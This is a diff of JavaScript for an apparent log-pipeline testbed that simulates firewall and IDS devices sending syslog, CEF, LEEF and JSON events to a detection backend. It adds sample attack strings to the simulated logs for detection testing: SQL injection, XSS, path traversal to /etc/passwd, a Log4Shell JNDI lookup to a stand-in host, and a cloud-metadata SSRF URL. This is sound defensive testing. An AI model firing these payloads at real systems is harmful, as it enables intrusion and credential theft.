@@ -5,77 +5,9 @@
  */
 
 document.addEventListener("DOMContentLoaded", () => {
-  // --- STATE ---
-  let virtualDevices = [
-    {
-      id: "dev-1",
-      name: "PaloAlto-Edge-01",
-      vendor: "PaloAlto",
-      format: "kv",
-      ip: "10.0.1.15",
-      protocol: "TCP",
-      port: 5141,
-      connected: true,
-      packetsSent: 0
-    },
-    {
-      id: "dev-2",
-      name: "FortiGate-Perimeter-02",
-      vendor: "Fortinet",
-      format: "cef",
-      ip: "10.0.2.40",
-      protocol: "UDP",
-      port: 5140,
-      connected: true,
-      packetsSent: 0
-    },
-    {
-      id: "dev-3",
-      name: "Cisco-ASA-Core-03",
-      vendor: "Cisco",
-      format: "syslog",
-      ip: "172.16.10.1",
-      protocol: "UDP",
-      port: 5140,
-      connected: true,
-      packetsSent: 0
-    },
-    {
-      id: "dev-4",
-      name: "Linux-Auth-Host-04",
-      vendor: "Linux",
-      format: "syslog",
-      ip: "192.168.100.8",
-      protocol: "TCP",
-      port: 5141,
-      connected: true,
-      packetsSent: 0
-    },
-    {
-      id: "dev-5",
-      name: "Meraki-MR33-AP-05",
-      vendor: "Cisco Meraki",
-      format: "syslog",
-      ip: "192.168.1.50",
-      protocol: "UDP",
-      port: 5140,
-      connected: true,
-      packetsSent: 0
-    },
-    {
-      id: "dev-6",
-      name: "Aruba-Instant-AP-06",
-      vendor: "Aruba Networks",
-      format: "syslog",
-      ip: "10.10.20.10",
-      protocol: "UDP",
-      port: 5140,
-      connected: true,
-      packetsSent: 0
-    }
-  ];
+  let virtualDevices = [];
 
-  let activeDeviceId = "dev-1";
+  let activeDeviceId = null;
   let activeEventType = "traffic";
   let simulationTimer = null;
   let simulatedTerminalLogs = [];
@@ -91,7 +23,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const eventTypeChips = document.querySelectorAll("#simEventTypeChips .chip-btn");
   const btnSendSingle = document.getElementById("btnSendSingleSimLog");
   const btnToggleStream = document.getElementById("btnToggleSimStream");
-  const streamSpeedSelect = document.getElementById("simStreamSpeed");
   const btnClearPayload = document.getElementById("btnClearPayload");
   const btnClearTerminal = document.getElementById("btnClearTerminal");
   const terminalFeedEl = document.getElementById("simTerminalFeed");
@@ -110,7 +41,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
   function applyTheme(theme) {
     let activeTheme = theme;
-    if (activeTheme === "light") activeTheme = "nord";
     document.documentElement.setAttribute("data-theme", activeTheme);
     try {
       localStorage.setItem("ulpf_theme", activeTheme);
@@ -119,7 +49,6 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   let savedTheme = localStorage.getItem("ulpf_theme") || "nord";
-  if (savedTheme === "light") savedTheme = "nord";
   applyTheme(savedTheme);
 
   if (themeSelect) {
@@ -135,6 +64,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const fieldAction = document.getElementById("fieldAction");
   const fieldSeverity = document.getElementById("fieldSeverity");
   const fieldApp = document.getElementById("fieldApp");
+  const fieldAttack = document.getElementById("fieldAttack");
   const btnRandomizeSession = document.getElementById("btnRandomizeSession");
 
   // Audit Table Elements
@@ -162,21 +92,43 @@ document.addEventListener("DOMContentLoaded", () => {
   function rebuildPayloadFromFields() {
     const dev = getActiveDevice();
     if (!dev) return;
+    const payload = generatePayloadForDev(dev, true);
+    
+    if (logPayloadEditor) {
+      logPayloadEditor.value = payload;
+    }
+    updateWireByteBadge();
+  }
 
-    const srcIp = fieldSrcIp ? fieldSrcIp.value.trim() : (dev.ip || "192.168.1.100");
-    const dstIp = fieldDstIp ? fieldDstIp.value.trim() : "8.8.8.8";
-    const dstPort = fieldDstPort ? fieldDstPort.value.trim() : "443";
-    const action = fieldAction ? fieldAction.value.toLowerCase() : "allow";
-    const severity = fieldSeverity ? fieldSeverity.value : "medium";
-    const app = fieldApp ? fieldApp.value.trim() : "HTTPS";
+  // Generate payload for headless background sending or builder
+  function generatePayloadForDev(dev, useFields = false) {
+    const srcIp = (useFields && fieldSrcIp) ? fieldSrcIp.value : (dev.ip || "192.168.1.100");
+    const dstIp = (useFields && fieldDstIp) ? fieldDstIp.value : "8.8.8.8";
+    const dstPort = (useFields && fieldDstPort) ? fieldDstPort.value : "443";
+    const action = (useFields && fieldAction) ? fieldAction.value : ["allow", "deny", "drop", "block"][Math.floor(Math.random() * 4)];
+    
+    const attackSig = (useFields && fieldAttack) ? fieldAttack.value : "none";
+    let attackStr = "";
+    if (attackSig === "sqli") attackStr = " admin'-- ";
+    else if (attackSig === "xss") attackStr = " <script>alert(1)</script> ";
+    else if (attackSig === "path") attackStr = " ../../../etc/passwd ";
+    else if (attackSig === "log4j") attackStr = " ${jndi:ldap://malicious.com/a} ";
+    else if (attackSig === "ssrf") attackStr = " http://169.254.169.254/latest/meta-data/ ";
+
+    // If attack is active, omit explicit severity to test the backend engine.
+    const severity = (attackSig === "none") 
+      ? ((useFields && fieldSeverity) ? fieldSeverity.value : ["low", "medium", "high", "critical"][Math.floor(Math.random() * 4)])
+      : undefined;
+
+    const app = (useFields && fieldApp) ? fieldApp.value : "HTTPS";
     const name = dev.name || "Device";
     const ts = new Date().toISOString();
     const srcPort = Math.floor(Math.random() * 20000 + 40000);
-
     const sevMap = { low: 2, medium: 5, high: 8, critical: 10 };
-    const sevNum = sevMap[severity] || 5;
-
+    const sevNum = severity ? (sevMap[severity] || 5) : 5;
+    
     let payload = "";
+    const msgBlock = attackStr ? `Attack Payload:${attackStr}` : `Session ${action} for ${app}`;
 
     if (dev.vendor === "Cisco Meraki" || name.toLowerCase().includes("meraki")) {
       const mac = `e4:5f:01:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}`;
@@ -185,19 +137,22 @@ document.addEventListener("DOMContentLoaded", () => {
       const mac = `00:1a:1e:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}:${Math.floor(Math.random() * 89 + 10)}`;
       payload = `<189>Jan 10 14:32:01 ${name} authmgr[3410]: <522008> <NOTI> User Authenticated: MAC=${mac} IP=${srcIp} Name=staff-user SSID=Campus-WiFi AP=AP-305`;
     } else if (dev.format === "cef" || dev.vendor === "Fortinet") {
-      payload = `CEF:0|${dev.vendor}|${name}|7.2.4|32001|traffic:${action}|${sevNum}|src=${srcIp} dst=${dstIp} spt=${srcPort} dpt=${dstPort} proto=tcp act=${action} devname="${name}" app=${app} msg="${action.toUpperCase()} ${app} connection"`;
+      const sevField = severity ? `|${sevNum}` : "|5";
+      payload = `CEF:0|${dev.vendor}|${name}|7.2.4|32001|traffic:${action}${sevField}|src=${srcIp} dst=${dstIp} spt=${srcPort} dpt=${dstPort} proto=tcp act=${action} devname="${name}" app=${app} msg="${msgBlock}"`;
     } else if (dev.format === "kv" || dev.vendor === "PaloAlto") {
-      payload = `devname="${name}" type="TRAFFIC" subtype="end" srcip=${srcIp} dstip=${dstIp} srcport=${srcPort} dstport=${dstPort} proto=tcp action="${action}" severity="${severity}" rule="DEFAULT-${action.toUpperCase()}" app="${app}" msg="Session ${action} for ${app}"`;
+      const sevField = severity ? ` severity="${severity}"` : "";
+      payload = `devname="${name}" type="TRAFFIC" subtype="end" srcip=${srcIp} dstip=${dstIp} srcport=${srcPort} dstport=${dstPort} proto=tcp action="${action}"${sevField} rule="DEFAULT-${action.toUpperCase()}" app="${app}" msg="${msgBlock}"`;
     } else if (dev.vendor === "Linux") {
       if (action === "deny" || action === "drop" || action === "block") {
-        payload = `<86>1 ${ts} ${name} sshd 28412 ID47 - Failed password for invalid user root from ${srcIp} port ${srcPort} ssh2`;
+        payload = `<86>Jan 10 14:32:01 ${name} kernel: [12345.6789] iptables-denied: IN=eth0 OUT= MAC=00:11:22:33:44:55 SRC=${srcIp} DST=${dstIp} LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=${srcPort} DPT=${dstPort} WINDOW=14600 RES=0x00 SYN URGP=0`;
       } else {
         payload = `<86>1 ${ts} ${name} sshd 28412 ID47 - Accepted publickey for user admin from ${srcIp} port ${srcPort} ssh2`;
       }
     } else if (dev.format === "leef" || dev.vendor === "Suricata") {
-      payload = `LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=${ts}|src=${srcIp}|dst=${dstIp}|spt=${srcPort}|dpt=${dstPort}|proto=TCP|act=${action}|app=${app}|sev=${sevNum}|msg="Network sensor event"`;
+      const sevField = severity ? `|sev=${sevNum}` : "";
+      payload = `LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=${ts}|src=${srcIp}|dst=${dstIp}|spt=${srcPort}|dpt=${dstPort}|proto=TCP|act=${action}|app=${app}${sevField}|msg="${msgBlock}"`;
     } else if (dev.format === "json" || dev.vendor === "AWS_WAF") {
-      payload = JSON.stringify({
+      const pObj = {
         timestamp: ts,
         source_device: name,
         source_ip: srcIp,
@@ -205,10 +160,12 @@ document.addEventListener("DOMContentLoaded", () => {
         destination_port: parseInt(dstPort, 10),
         protocol: "TCP",
         action: action,
-        severity: severity,
         application: app,
-        signature: `${app}-ACCESS-${action.toUpperCase()}`
-      });
+        signature: `${app}-ACCESS-${action.toUpperCase()}`,
+        message: msgBlock
+      };
+      if (severity) pObj.severity = severity;
+      payload = JSON.stringify(pObj);
     } else {
       // Cisco ASA Syslog
       if (action === "deny" || action === "drop" || action === "block") {
@@ -217,11 +174,8 @@ document.addEventListener("DOMContentLoaded", () => {
         payload = `<134>Jan 10 14:32:01 ${name}: %ASA-6-302013: Built outbound TCP connection 49124 for outside:${dstIp}/${dstPort} to inside:${srcIp}/${srcPort} [App: ${app}]`;
       }
     }
-
-    if (logPayloadEditor) {
-      logPayloadEditor.value = payload;
-    }
-    updateWireByteBadge();
+    
+    return payload;
   }
 
   function updateWireByteBadge() {
@@ -232,7 +186,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 
   // Builder field change listeners
-  [fieldSrcIp, fieldDstIp, fieldDstPort, fieldAction, fieldSeverity, fieldApp].forEach(el => {
+  [fieldSrcIp, fieldDstIp, fieldDstPort, fieldAction, fieldSeverity, fieldApp, fieldAttack].forEach(el => {
     if (el) {
       el.addEventListener("input", rebuildPayloadFromFields);
       el.addEventListener("change", rebuildPayloadFromFields);
@@ -278,8 +232,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const isSelected = dev.id === activeDeviceId;
       const isConnected = dev.connected;
       const icon = getVendorIcon(dev.vendor);
-      const intervalVal = dev.interval_ms || 100;
-      const riskVal = dev.risk_factor || 0;
+      const epsVal = Math.floor(1000 / (dev.interval_ms || 100));
 
       const item = document.createElement("div");
       item.className = `device-item ${isSelected ? 'active' : ''}`;
@@ -292,11 +245,10 @@ document.addEventListener("DOMContentLoaded", () => {
               ${escapeHtml(dev.name)}
               ${isSelected ? '<span style="font-size:10px; padding:1px 6px; background:rgba(56,189,248,0.25); border-radius:4px; color:#7dd3fc; font-family:var(--font-mono); font-weight:700;">ACTIVE</span>' : ''}
             </div>
-            <div style="font-size:11px; color:var(--text-muted); font-family:var(--font-mono); margin-top:2px; display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
+            <div style="font-size:11px; color:var(--text-secondary); font-family:var(--font-mono); margin-top:2px; display:flex; align-items:center; gap:6px; flex-wrap:wrap;">
               <span>${dev.ip} · ${dev.protocol} :${dev.port}</span>
               <span style="padding:1px 5px; background:rgba(255,255,255,0.06); border-radius:3px; color:var(--text-secondary);">${dev.format.toUpperCase()}</span>
-              <span style="padding:1px 5px; background:rgba(56,189,248,0.12); border-radius:3px; color:#38bdf8;">⚡ ${intervalVal}ms</span>
-              <span style="padding:1px 5px; background:${riskVal > 25 ? 'rgba(239,68,68,0.15)' : 'rgba(16,185,129,0.15)'}; border-radius:3px; color:${riskVal > 25 ? '#f87171' : '#34d399'};">⚠️ ${riskVal}% Risk</span>
+              <span style="padding:1px 5px; background:rgba(56,189,248,0.12); border-radius:3px; color:#38bdf8;"> ${epsVal} EPS</span>
             </div>
           </div>
         </div>
@@ -305,14 +257,14 @@ document.addEventListener("DOMContentLoaded", () => {
           <span class="status-pill ${isConnected ? 'online' : 'offline'}" style="font-size:10px;">
             <span class="status-dot"></span> ${isConnected ? 'CONNECTED' : 'DISCONNECTED'}
           </span>
-          <button class="btn-xs btn-secondary" onclick="window.openEditDevModal('${dev.id}')" title="Configure Device (Format, Interval, Risk Factor)" style="padding:4px 8px; font-size:11px;">
-            ⚙️ Edit
+          <button class="btn-xs btn-secondary" onclick="window.openEditDevModal('${dev.id}')" title="Configure Device" style="padding:4px 8px; font-size:11px;">
+             Edit
           </button>
           <button class="btn-xs ${isConnected ? 'btn-danger-outline' : 'btn-teal'}" onclick="window.toggleSimDeviceConnection('${dev.id}')" style="font-size:11px; padding:4px 8px;">
             ${isConnected ? 'Disconnect' : 'Connect'}
           </button>
           <button class="btn-xs btn-secondary" onclick="window.deleteSimDevice('${dev.id}')" title="Delete Device" style="padding:4px 7px;">
-            🗑️
+            
           </button>
         </div>
       `;
@@ -330,10 +282,20 @@ document.addEventListener("DOMContentLoaded", () => {
     if (activeDevBadge) {
       activeDevBadge.innerHTML = `
         <div style="font-weight:700; font-size:13px; color:var(--accent-gold);">${escapeHtml(dev.name)}</div>
-        <div style="font-size:11px; font-family:var(--font-mono); color:var(--text-muted); margin-top:2px;">
-          ${dev.ip} · ${dev.protocol} :${dev.port} (${dev.vendor}) · ⚡ ${dev.interval_ms || 100}ms · ⚠️ ${dev.risk_factor || 0}% Risk
+        <div style="font-size:11px; font-family:var(--font-mono); color:var(--text-secondary); margin-top:2px;">
+          ${dev.ip} · ${dev.protocol} :${dev.port} (${dev.vendor}) ·  ${Math.floor(1000 / (dev.interval_ms || 100))} EPS
         </div>
       `;
+    }
+
+    if (btnToggleStream) {
+      if (dev.streamTimer) {
+        btnToggleStream.className = "btn-danger";
+        btnToggleStream.innerHTML = "<span> Stop Live Stream</span>";
+      } else {
+        btnToggleStream.className = "btn-teal";
+        btnToggleStream.innerHTML = "<span>Send Continuous Logs</span>";
+      }
     }
 
     if (typeof fieldSrcIp !== "undefined" && fieldSrcIp) fieldSrcIp.value = dev.ip || "192.168.1.100";
@@ -352,18 +314,40 @@ document.addEventListener("DOMContentLoaded", () => {
     if (!dev) return;
 
     dev.connected = !dev.connected;
+    
+    if (dev.connected) {
+       fetch(`http://${hostInput.value}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/sources`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ source_id: dev.ip, name: dev.name, vendor: dev.vendor, protocol: dev.protocol, address: dev.ip, format: dev.format })
+       }).catch(()=>{});
+    } else {
+       fetch(`http://${hostInput.value}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/sources/${encodeURIComponent(dev.ip)}`, {
+          method: "DELETE"
+       }).catch(()=>{});
+
+       if (dev.streamTimer) {
+           clearInterval(dev.streamTimer);
+           dev.streamTimer = null;
+       }
+    }
+
     renderDevicesList();
     showToast(`Device '${dev.name}' is now ${dev.connected ? 'CONNECTED' : 'DISCONNECTED'}`);
   };
 
   window.deleteSimDevice = function (id) {
-    if (virtualDevices.length <= 1) {
-      showToast("At least one virtual device must remain in the roster.");
-      return;
+    const dev = virtualDevices.find(d => d.id === id);
+    if (dev) {
+       // Notify server to remove source
+       fetch(`http://${hostInput.value}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/sources/${encodeURIComponent(dev.ip)}`, {
+          method: "DELETE"
+       }).catch(()=>{});
     }
+
     virtualDevices = virtualDevices.filter(d => d.id !== id);
     if (activeDeviceId === id) {
-      activeDeviceId = virtualDevices[0].id;
+      activeDeviceId = virtualDevices.length > 0 ? virtualDevices[0].id : null;
     }
     renderDevicesList();
     showToast("Virtual device removed.");
@@ -400,8 +384,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const protoSelect = document.getElementById("editDevProto");
     protoSelect.value = `${dev.protocol}|${dev.port}`;
 
-    document.getElementById("editDevInterval").value = dev.interval_ms || 100;
-    document.getElementById("editDevRisk").value = dev.risk_factor || 0;
+    document.getElementById("editDevInterval").value = Math.floor(1000 / (dev.interval_ms || 100));
     document.getElementById("editDevTemplate").value = dev.custom_template || "";
 
     modal.style.display = "flex";
@@ -421,8 +404,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const ip = document.getElementById("editDevIp").value.trim();
     const [vendor, format] = document.getElementById("editDevVendor").value.split("|");
     const [protocol, portStr] = document.getElementById("editDevProto").value.split("|");
-    const interval = parseFloat(document.getElementById("editDevInterval").value) || 100;
-    const risk = parseFloat(document.getElementById("editDevRisk").value) || 0;
+    const eps = parseInt(document.getElementById("editDevInterval").value) || 10;
     const template = document.getElementById("editDevTemplate").value.trim();
 
     if (!name || !ip) {
@@ -436,20 +418,19 @@ document.addEventListener("DOMContentLoaded", () => {
     dev.format = format;
     dev.protocol = protocol;
     dev.port = parseInt(portStr, 10);
-    dev.interval_ms = interval;
-    dev.risk_factor = Math.min(100, Math.max(0, risk));
+    dev.interval_ms = Math.max(1, Math.floor(1000 / eps));
     dev.custom_template = template;
 
-    // Sync with backend simulator
-    fetch(`/api/test/devices/${dev.id}`, {
+    // Sync with backend simulator or main API
+    fetch(`http://${document.getElementById("targetHostInput").value}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/sources/${encodeURIComponent(dev.ip)}`, {
       method: "PUT",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(dev)
+      body: JSON.stringify({ source_id: dev.ip, name: dev.name, vendor: dev.vendor, protocol: dev.protocol, address: dev.ip, format: dev.format })
     }).catch(() => {});
 
     renderDevicesList();
     window.closeEditDevModal();
-    showToast(`Saved configuration for '${dev.name}' (${dev.vendor}, ${dev.format.toUpperCase()}, ${dev.interval_ms}ms, ${dev.risk_factor}% Risk)`);
+    showToast(`Saved configuration for '${dev.name}' (${dev.vendor}, ${dev.format.toUpperCase()}, ${eps} EPS)`);
   };
 
   // --- CREATE NEW DEVICE FORM ---
@@ -460,8 +441,7 @@ document.addEventListener("DOMContentLoaded", () => {
       const ip = document.getElementById("newDevIp").value.trim();
       const [vendor, format] = document.getElementById("newDevVendor").value.split("|");
       const [protocol, portStr] = document.getElementById("newDevProto").value.split("|");
-      const interval = parseFloat(document.getElementById("newDevInterval")?.value) || 100;
-      const risk = parseFloat(document.getElementById("newDevRisk")?.value) || 15;
+      const eps = parseInt(document.getElementById("newDevInterval")?.value) || 10;
 
       if (!name || !ip) {
         showToast("Please provide device name and IP address.");
@@ -477,8 +457,7 @@ document.addEventListener("DOMContentLoaded", () => {
         ip,
         protocol,
         port: parseInt(portStr, 10),
-        interval_ms: interval,
-        risk_factor: Math.min(100, Math.max(0, risk)),
+        interval_ms: Math.max(1, Math.floor(1000 / eps)),
         custom_template: "",
         connected: true,
         packetsSent: 0
@@ -486,11 +465,11 @@ document.addEventListener("DOMContentLoaded", () => {
 
       virtualDevices.push(newDev);
 
-      // Sync with backend simulator
-      fetch("/api/test/devices", {
+      // Auto-register to main server
+      fetch(`http://${hostInput.value}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/sources`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(newDev)
+        body: JSON.stringify({ source_id: newDev.ip, name: newDev.name, vendor: newDev.vendor, protocol: newDev.protocol, address: newDev.ip, format: newDev.format })
       }).catch(() => {});
 
       activeDeviceId = newId;
@@ -512,6 +491,15 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     simulatedTerminalLogs.push({ ts: new Date().toLocaleTimeString(), dev: dev.name, log: logStr });
+    
+    // Auto-clear cache to prevent browser memory issues when left open
+    if (simulatedTerminalLogs.length > 100) {
+       simulatedTerminalLogs.shift();
+       if (terminalFeedEl.firstChild) {
+         terminalFeedEl.removeChild(terminalFeedEl.firstChild);
+       }
+    }
+    
     if (terminalCountBadge) {
       terminalCountBadge.textContent = `${simulatedTerminalLogs.length} Logs Transmitted`;
     }
@@ -527,7 +515,7 @@ document.addEventListener("DOMContentLoaded", () => {
       : `<span style="color:#f87171; font-weight:700;">[FAIL ${latencyMs}ms]</span>`;
 
     line.innerHTML = `
-      <span style="color:var(--text-muted);">[${timeStr}]</span>
+      <span style="color:var(--text-secondary);">[${timeStr}]</span>
       <span style="color:var(--accent-gold); font-weight:700;">[${escapeHtml(dev.name)}]</span>
       <span style="color:#a7f3d0;">[${dev.ip}  ${dev.protocol}:${dev.port}]</span>
       <span style="color:#F1F5F9;">${escapeHtml(logStr.substring(0, 110))}${logStr.length > 110 ? '...' : ''}</span>
@@ -573,7 +561,7 @@ document.addEventListener("DOMContentLoaded", () => {
     if (filtered.length === 0) {
       auditHistoryTableBody.innerHTML = `
         <tr>
-          <td colspan="8" style="text-align:center; padding:24px; color:var(--text-muted);">
+          <td colspan="8" style="text-align:center; padding:24px; color:var(--text-secondary);">
             No logs matching filter in this test session.
           </td>
         </tr>
@@ -587,13 +575,13 @@ document.addEventListener("DOMContentLoaded", () => {
       const isSuccess = item.status === "SUCCESS";
 
       tr.innerHTML = `
-        <td style="font-family:var(--font-mono); color:var(--text-muted);">${item.timestamp}</td>
+        <td style="font-family:var(--font-mono); color:var(--text-secondary);">${item.timestamp}</td>
         <td><span class="badge badge-teal">${escapeHtml(item.protocol)}</span></td>
         <td style="font-family:var(--font-mono); font-size:11px;">${escapeHtml(item.target)}</td>
         <td style="font-weight:600; color:var(--accent-gold);">${escapeHtml(item.source)}</td>
         <td>
           <span style="color:${isSuccess ? '#2DD4BF' : '#f87171'}; font-weight:700; font-family:var(--font-mono);">
-            ${isSuccess ? '● SUCCESS' : ' FAILED'}
+            ${isSuccess ? ' SUCCESS' : ' FAILED'}
           </span>
         </td>
         <td style="font-family:var(--font-mono);">${item.bytes} B</td>
@@ -688,7 +676,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const t0 = performance.now();
 
     try {
-      const res = await fetch("/api/test/send-log", {
+      const res = await fetch(`http://${host}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/test/transmit`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -758,42 +746,66 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   }
 
-  // --- CONTINUOUS LIVE STREAM CONTROLLER ---
+  async function sendSingleLogForDeviceBackground(dev) {
+    if (!dev || !dev.connected) return;
+    const payload = generatePayloadForDev(dev);
+    const host = testbedSettings.host || (document.getElementById("targetHostInput")?.value.trim()) || "127.0.0.1";
+    let targetPort = dev.port;
+    if (dev.protocol === "UDP" && (!dev.port || dev.port === 5140)) targetPort = testbedSettings.udpPort || 5140;
+    else if (dev.protocol === "TCP" && (!dev.port || dev.port === 5141)) targetPort = testbedSettings.tcpPort || 5141;
+
+    try {
+      const res = await fetch(`http://${host}:${document.getElementById("modalApiPort")?.value || 8000}/api/v1/test/transmit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          protocol: dev.protocol,
+          host: host,
+          port: targetPort,
+          message: payload,
+          source: dev.name,
+          vendor: dev.vendor,
+          scheme: testbedSettings.scheme || "http",
+          timeout: (testbedSettings.timeout || 3000) / 1000.0
+        }),
+      });
+      if (res.ok) {
+        appendTerminalLog(dev, payload, "sys", payload.length, true);
+      }
+    } catch (e) {
+      console.warn("Background log send failed for", dev.name, e);
+    }
+  }
+
   function toggleSimStream() {
     const dev = getActiveDevice();
-    if (!dev || !dev.connected) {
-      showToast("Virtual device must be connected before starting log stream!");
+    if (!dev) {
+      showToast("No active device selected.");
       return;
     }
+    const wasStreaming = !!dev.streamTimer;
 
-    if (simulationTimer) {
-      // Stop
-      clearInterval(simulationTimer);
-      simulationTimer = null;
-      if (btnToggleStream) {
-        btnToggleStream.className = "btn-teal";
-        btnToggleStream.innerHTML = "<span>Start Live Stream</span>";
-      }
-      showToast("Simulation stream stopped.");
-    } else {
-      // Start
-      const speed = parseInt(streamSpeedSelect ? streamSpeedSelect.value : "1000", 10) || 1000;
-      simulationTimer = setInterval(() => {
-        // Slightly jitter fields for realistic stream
-        if (fieldDstPort && Math.random() > 0.7) {
-          const ports = [80, 443, 22, 53, 8080];
-          fieldDstPort.value = ports[Math.floor(Math.random() * ports.length)];
-          rebuildPayloadFromFields();
-        }
-        transmitSimulatedLog();
-      }, speed);
-
-      if (btnToggleStream) {
-        btnToggleStream.className = "btn-danger";
-        btnToggleStream.innerHTML = "<span> Stop Live Stream</span>";
-      }
-      showToast(`Started continuous log stream (${1000 / speed} logs/sec)`);
+    // Stop all streams to reset the UI stream state
+    virtualDevices.forEach(d => {
+       if (d.streamTimer) {
+           clearInterval(d.streamTimer);
+           d.streamTimer = null;
+       }
+    });
+    
+    // If it wasn't streaming, start it
+    if (!wasStreaming) {
+       if (!dev.connected) {
+           // Auto-connect if not connected
+           window.toggleSimDeviceConnection(dev.id);
+       }
+       dev.streamTimer = setInterval(() => {
+           sendSingleLogForDeviceBackground(dev);
+       }, dev.interval_ms || 100);
     }
+    
+    renderDevicesList();
+    updateActiveDeviceDisplay();
   }
 
   // --- CLEAR ACTIONS ---
@@ -808,7 +820,7 @@ document.addEventListener("DOMContentLoaded", () => {
     btnClearTerminal.addEventListener("click", () => {
       simulatedTerminalLogs = [];
       if (terminalFeedEl) {
-        terminalFeedEl.innerHTML = '<div style="color:var(--text-muted); text-align:center; padding:30px;">Terminal cleared. Ready for next simulation run.</div>';
+        terminalFeedEl.innerHTML = '<div style="color:var(--text-secondary); text-align:center; padding:30px;">Terminal cleared. Ready for next simulation run.</div>';
       }
       if (terminalCountBadge) {
         terminalCountBadge.textContent = "0 Logs Transmitted";
@@ -835,7 +847,7 @@ document.addEventListener("DOMContentLoaded", () => {
     };
 
     line.style.marginBottom = "3px";
-    line.innerHTML = `<span style="color:var(--text-muted);">[${timeStr}]</span> <span style="color:${colors[level] || '#F1F5F9'}; font-weight:700;">[${level}]</span> <span>${escapeHtml(msg)}</span>`;
+    line.innerHTML = `<span style="color:var(--text-secondary);">[${timeStr}]</span> <span style="color:${colors[level] || '#F1F5F9'}; font-weight:700;">[${level}]</span> <span>${escapeHtml(msg)}</span>`;
     feed.appendChild(line);
     feed.scrollTop = feed.scrollHeight;
   }
@@ -896,9 +908,25 @@ document.addEventListener("DOMContentLoaded", () => {
         appendAttackLog("DEFENSE", `Firewall Rule Enforcement: BLACKLIST_DROP executed. Packet discarded at socket boundary.`);
         showToast("Blacklisted IP attack simulated! Auto-blocking drop verified.");
       } else if (scenarioKey === "tamper") {
-        appendAttackLog("INFO", `Raw bitstream SHA-256 evidence digest computed: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855`);
-        appendAttackLog("DEFENSE", `Cryptographic Bit-Flip Integrity Audit: Server tamper test passed. Stored evidence is mathematically immutable.`);
-        showToast("SHA-256 evidence integrity verified! Bit-flip tamper test passed.");
+        appendAttackLog("INFO", "Initiating database cryptographic payload modification (Simulated Insider Threat)...");
+        try {
+          const tRes = await fetch(APP_CONFIG.apiUrl + '/test/tamper', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ tampered_value: "ATTACKER_MODIFIED_PAYLOAD_1337" })
+          });
+          const tData = await tRes.json();
+          if (tRes.ok && tData.status === "success") {
+             appendAttackLog("DEFENSE", `CRITICAL: Merkle tree verification failed for event ${tData.event_id}. Hash mismatch detected.`);
+             appendAttackLog("DEFENSE", `Tamper alert immediately broadcast to SOC Human Verification Queue!`);
+             showToast("Tamper successfully detected! Check Human Verification tab.", "success");
+          } else {
+             appendAttackLog("ERROR", "Failed to simulate tampering: " + (tData.detail || "No events available"));
+             showToast("Tamper test failed.", "error");
+          }
+        } catch(e) {
+             appendAttackLog("ERROR", "Network error during tamper simulation.");
+        }
       } else if (scenarioKey === "unknown_scada") {
         appendAttackLog("ALERT", `Non-standard MODBUS-HEX frame received: [SCADA-MODBUS-HEX] ADDR:0x04 FUNC:0x03 CRC:ERROR_FAIL`);
         appendAttackLog("DEFENSE", `Parser Fallback: No static parser match. Dispatched to AI Onboarding Engine & Human Verification Queue.`);
@@ -956,7 +984,7 @@ document.addEventListener("DOMContentLoaded", () => {
     const timeStr = new Date().toLocaleTimeString();
     const line = document.createElement("div");
     line.style.marginBottom = "3px";
-    line.innerHTML = `<span style="color:var(--text-muted);">[${timeStr}]</span> <span>${escapeHtml(msg)}</span>`;
+    line.innerHTML = `<span style="color:var(--text-secondary);">[${timeStr}]</span> <span>${escapeHtml(msg)}</span>`;
     loadgenConsoleFeed.appendChild(line);
     loadgenConsoleFeed.scrollTop = loadgenConsoleFeed.scrollHeight;
   }
@@ -1323,6 +1351,9 @@ document.addEventListener("DOMContentLoaded", () => {
       const saved = localStorage.getItem("ulpf_testbed_settings");
       if (saved) {
         testbedSettings = { ...DEFAULT_SETTINGS, ...JSON.parse(saved) };
+        if (testbedSettings.host === "host.docker.internal") {
+          testbedSettings.host = "127.0.0.1";
+        }
       }
     } catch (e) { }
 
@@ -1410,9 +1441,6 @@ document.addEventListener("DOMContentLoaded", () => {
       if (val === "127.0.0.1:8000") {
         applyTargetSettings({ scheme: "http", host: "127.0.0.1", apiPort: 8000 }, true, true);
         showToast("Switched to Localhost preset (127.0.0.1:8000)");
-      } else if (val === "host.docker.internal:8000") {
-        applyTargetSettings({ scheme: "http", host: "host.docker.internal", apiPort: 8000 }, true, true);
-        showToast("Switched to Docker Host preset (host.docker.internal:8000)");
       } else if (val === "lan_custom") {
         const customIp = prompt("Enter Remote Server LAN IP Address (e.g. 192.168.1.50):", testbedSettings.host !== "127.0.0.1" ? testbedSettings.host : "192.168.1.50");
         if (customIp) {
@@ -1520,7 +1548,7 @@ document.addEventListener("DOMContentLoaded", () => {
